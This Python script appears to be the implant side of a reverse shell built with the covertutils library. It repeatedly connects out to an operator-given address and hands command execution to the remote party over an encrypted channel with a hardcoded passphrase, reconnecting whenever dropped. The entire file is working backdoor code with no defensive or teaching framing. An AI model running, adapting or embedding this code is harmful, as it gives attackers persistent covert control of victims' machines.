#!/usr/bin/env python
from covertutils.handlers.impl import SimpleShellHandler
from covertutils.orchestration import SimpleOrchestrator

import sys
import socket
from time import sleep

from hashlib import sha512

passphrase = "Pa55phra531"
addr = sys.argv[1], int(sys.argv[2])
delay = int( sys.argv[3] )

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

closed = True

while True :

    if closed :
        try :
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect( addr )
            closed = False
        except Exception as e:
            sleep( delay )
            continue

    def recv () :
        global closed
        ret = s.recv(50)
        if ret == '' :      # in empty string socket is closed
            closed = True
            s.close()
            ret = 'X'
        return ret


    def send( raw ) :
    	return s.send( raw )

    orch = SimpleOrchestrator( passphrase, tag_length = 2, out_length = 50, in_length = 50, reverse = True, cycling_algorithm = sha512 )
    handler = SimpleShellHandler( recv, send, orch )	# Create the Handler Daemon Thread


    while not closed : sleep(1)
    # while True : sleep(10)
